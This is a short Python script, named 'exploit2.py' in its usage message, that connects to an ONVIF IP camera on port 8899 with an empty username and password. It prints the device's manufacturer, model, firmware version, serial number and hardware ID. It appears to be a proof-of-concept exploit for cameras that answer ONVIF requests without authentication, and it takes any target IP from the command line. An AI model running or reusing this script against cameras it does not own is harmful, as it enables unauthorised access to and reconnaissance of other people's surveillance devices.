import sys
from onvif import ONVIFCamera


def make_request(ip):
    port = 8899
    username = ''
    password = ''

    camera = ONVIFCamera(ip, port, username, password)

    device_information = camera.devicemgmt.GetDeviceInformation()

    print(f"Device Information:")
    print(f"Manufacturer: {device_information.Manufacturer}")
    print(f"Model: {device_information.Model}")
    print(f"Firmware Version: {device_information.FirmwareVersion}")
    print(f"Serial Number: {device_information.SerialNumber}")
    print(f"Hardware ID: {device_information.HardwareId}")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("How to use: python3 exploit2.py <IP>\n")
        sys.exit(1)

    make_request(sys.argv[1])

